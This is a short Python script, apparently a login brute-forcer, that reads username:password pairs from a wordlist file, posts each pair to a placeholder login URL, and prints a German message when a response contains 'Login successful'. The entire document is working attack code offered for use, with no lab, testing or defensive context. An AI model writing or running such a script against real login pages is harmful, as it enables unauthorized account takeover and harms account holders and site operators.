import requests

target_url = "http://example.com/login"
username_field = "username"
password_field = "password"
wordlist_path = "/path/to/wordlist.txt"

def brute_force(username, password):
    data = {
        username_field: username,
        password_field: password
    }
    
    response = requests.post(target_url, data=data)
    
    if "Login successful" in response.text:
        print("Zugangsdaten gefunden! Benutzername: {}, Passwort: {}".format(username, password))

with open(wordlist_path, "r") as wordlist:
    for line in wordlist:
        credentials = line.strip().split(":")
        username = credentials[0]
        password = credentials[1]
        brute_force(username, password)
